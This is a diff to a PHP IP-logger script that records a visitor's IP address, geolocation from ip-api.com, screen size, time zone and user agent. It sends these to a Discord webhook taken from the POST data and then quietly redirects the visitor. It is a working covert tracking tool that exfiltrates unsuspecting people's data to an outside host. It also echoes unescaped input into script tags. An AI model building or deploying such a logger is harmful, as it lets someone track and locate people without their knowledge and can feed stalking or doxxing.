@@ -1,5 +1,13 @@
 <?php
 
+if ($_SERVER['REQUEST_METHOD'] === 'POST') 
+{
+    if(isset($_POST['link']))
+	{
+		LogData($_POST);
+	}
+}
+
 function write($data)
 {
     File_Put_Contents("logs.txt", $data, FILE_APPEND);
@@ -20,18 +28,18 @@ function SendDiscordMesg($webhook,$msg)
      $response   = curl_exec($ch);
 }
 
-function LogData($webhook)
+function LogData($device)
 { 
-    echo "<script src=iplogger.js></script>";
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    $data =  file_get_contents("http://ip-api.com/json/".IP() ."?fields=16989897");
+    $data = "\"Width=\":".$device['Width']."\n\"Height=\":".$device['Height']."\n\"TimeZone=\":".$device['TimeZone']."\n";
+    $data = $data.file_get_contents("http://ip-api.com/json/".IP() ."?fields=16989897");
     $data = str_replace(',',"\n",$data);
     $data = str_replace('{',"",$data);
     $data = str_replace('}',"",$data);
     $data = $data."\n".
-    '"User_agent":'.$user_agent;
+    '"User_agent":'.$_SERVER['HTTP_USER_AGENT'];
     write($data);     
-    SendDiscordMesg($webhook,$data);	
+    SendDiscordMesg($device['link'], $data);
+    echo "<script>window.location='".$device['redirect']."'</script>";	
 }
 
 
@@ -40,10 +48,16 @@ function IP()
     //https://github.com/CybrDev/IP-Logger Get_IP
     $ip = "unknown";
     if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) $ip = getenv("HTTP_CLIENT_IP"); 
-    else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) $ip = getenv("HTTP_X_FORWARDED_FOR"); 
-    else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) $ip = getenv("REMOTE_ADDR"); 
-    else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) $ip = $_SERVER['REMOTE_ADDR'];     
-    
-    return $ip;
+	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) $ip = getenv("HTTP_X_FORWARDED_FOR"); 
+	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) $ip = getenv("REMOTE_ADDR"); 
+	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) $ip = $_SERVER['REMOTE_ADDR'];     
+	return $ip;
 } 
+
+
+function logger($log)
+{
+	echo "<script>console.log('$log');</script>";
+}
+
 ?>
